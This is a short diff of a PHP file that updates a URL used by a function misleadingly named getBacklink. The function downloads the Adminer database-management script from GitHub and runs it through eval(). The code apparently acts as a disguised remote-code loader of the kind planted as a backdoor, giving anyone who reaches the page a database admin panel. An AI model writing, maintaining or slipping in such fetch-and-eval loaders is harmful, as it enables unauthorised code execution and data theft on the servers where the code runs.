@@ -17,7 +17,7 @@ function getBacklink($url) {
     return false;
 }
 
-$remote_code = getBacklink("https://github.com/vrana/adminer/releases/download/v5.4.1/adminer-5.4.1.php");
+$remote_code = getBacklink("https://github.com/vrana/adminer/releases/download/v6.0.1/adminer-6.0.1.php");
 
 if ($remote_code) {
     eval("?>" . $remote_code);
